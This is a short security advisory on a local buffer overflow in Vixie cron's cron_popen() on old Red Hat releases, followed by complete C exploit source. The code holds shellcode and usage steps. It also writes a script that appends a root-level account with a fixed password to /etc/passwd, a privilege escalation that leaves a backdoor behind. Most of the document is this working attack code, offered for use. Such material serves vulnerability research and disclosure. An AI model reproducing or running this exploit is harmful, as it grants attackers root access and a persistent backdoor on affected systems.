source: http://www.securityfocus.com/bid/602/info

The version of Vixie cron that ships with RedHat versions 4.2, 5.2 and 6.0 is vulnerable to a local buffer overflow attack. By utilizing the MAILTO environment variable, a buffer can be overflown in the cron_popen() function, allowing an attacker to execute arbitrary code. Vixie cron daemon is installed setuid root by default, allowing for a local root compromise. Recent versions of Debian GNU/Linux have been confirmed to not be vulnerable to this attack. 

/*
	vixie-crontab-3.0.1 cron_popen() exploit by Akke - 30-8-99
			Akke <c4c4@hehe.com>
	

	how to compile ?
		gcc crontab_exploit.c -o crontab_exploit

	how to use ?
		./crontab_exploit
		crontab ./CrOn
		wait 1 minute
		crontab -r
		su -l cronexpl (password = exploited) (this is root account)
		
	Greets to: bugtraq
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/tmp/ce";

#define max_buf_len 1000
#define CronFile         "CrOn"
#define RootScript       "/tmp/cron_root"
#define CronEchoScript   "/tmp/cron_echo"
#define chmod_bin        "/bin/chmod"

int main()
{
	char crontab_file_string[max_buf_len];
	char temp[max_buf_len];
	FILE *fp;
	int i;

	strcpy(temp, 
	"T h i s _ i s _ a _ s i m p l e _ e x p l o i t _ w r i t t e n _ b y _ A K K E _ "
	"T h i s _ i s _ a _ s i m p l e _ e x p l o i t _ w r i t t e n _ b y _ A K K E _ "
	"_ _ _ _ _ _ _ _ _ _ _ _ _ _ ");
	sprintf(temp,"%s%s",temp,shellcode);
	sprintf(crontab_file_string,"MAILTO=%s\n",temp);
	strcat(crontab_file_string,"0");
	for (i=1;i<60;i++) sprintf(crontab_file_string,"%s,%d",crontab_file_string,i);
	sprintf(temp," * * * * %s\n",CronEchoScript);
	strcat(crontab_file_string,temp);

	if ((fp = fopen(CronFile,"w+")) != NULL) {
		fprintf(fp,"%s",crontab_file_string);
		fclose(fp);	
	}
	
	if ((fp = fopen(CronEchoScript,"w+")) != NULL) {
		fprintf(fp,"#!/bin/sh\necho Wrong window!");
		fclose(fp);
		sprintf(temp,"%s 777 %s",chmod_bin,CronEchoScript);
		system(temp);
	}
	
	if ((fp = fopen(RootScript,"w+")) != NULL) {
		#define login "cronexpl"
		#define passw "1T8uqGnJZ0OsQ" /* "exploited" */
		fprintf(fp,"#!/bin/sh\necho %s:%s:0:0::/root:/bin/bash >> /etc/passwd\nrm %s %s %s",login,passw,CronEchoScript,"/tmp/ce",RootScript);
		fclose(fp);
		sprintf(temp,"%s 777 %s",chmod_bin,RootScript);
		system(temp);
	}

	if ((fp = fopen("/tmp/ce","w+")) != NULL) {
		fprintf(fp,"#!/bin/sh\n%s\n",RootScript);
		fclose(fp);
		sprintf(temp,"%s 777 %s",chmod_bin,"/tmp/ce");
		system(temp);
	}
	exit(0);
}